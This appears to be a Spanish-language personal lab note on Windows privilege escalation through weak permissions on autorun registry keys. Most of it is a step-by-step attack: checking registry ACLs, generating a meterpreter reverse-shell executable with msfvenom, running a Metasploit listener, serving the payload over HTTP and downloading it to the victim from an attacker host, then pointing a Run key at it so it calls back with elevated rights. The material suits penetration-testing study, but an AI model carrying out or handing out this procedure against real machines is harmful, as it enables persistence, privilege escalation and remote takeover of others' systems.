
Consiste en modificar las claves de registro para que sean usadas automáticamente cuando ocurra cierto evento. Generalmente en:

- Inicio del equipo
- Login de usuario
- Inicio de servicio

 El procedimiento a seguir es:
1. Identificar registros autoruns vulnerables.
2. Explotar los permisos débiles.
3. Conseguir escalar privilegios.


```powershell
Get-Acl -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' | Format-List
```

Con este comando podemos saber si tenemos acceso a un determinado registro del sistema desde el usuario actual.

![[Pasted image 20250219090620.png]]

Como se puede apreciar el usuario student (en este ejemplo) tiene acceso a todo el control.

```powershell
regedit
```

Con este comando podemos abrir la interfaz gráfica de gestión de registros.

![[Pasted image 20250219090809.png]]

Es posible que no se nos deje modificar el registro pero si el path y apuntar a un payload generado por msfvenom.

```powershell
Get-Acl -Path 'C:\Program Files\HTTPServer' | Format-List
```

![[Pasted image 20250219091011.png]]

En este ejemplo solo tendríamos permisos de lectura y ejecución, con lo que no lo podemos llegar a modificar.

Uno de los pasos sería crear nuestro propio registro, en este caso el llamado "hacker".

![[Pasted image 20250219091128.png]]

```powershell
cd .\Desktop\
mkdir tool
```

```bash
#Generar el payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=Local_IP LPORT=PORT -f exe > program.exe

#Poner el listener
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST
exploit

#Poner un web server
python -m SimpleHTTPServer 80
```

```powershell
#Descargar el payload
iwr -YseBasicParsing -Uri http://ip_attacker/file -OutFile 'C:\Users/student/Desktop\tool\program.exe'
```

Una vez descargado el payload tenemos que modificar el registro para que apunte a este archivo.

![[Pasted image 20250219092022.png]]

```powershell
#Reiniciamos el sistema y con eso ya debería ejecutar el autorun y mandarnos una petición de conexión con permisos elevados.
shutdown -l
```

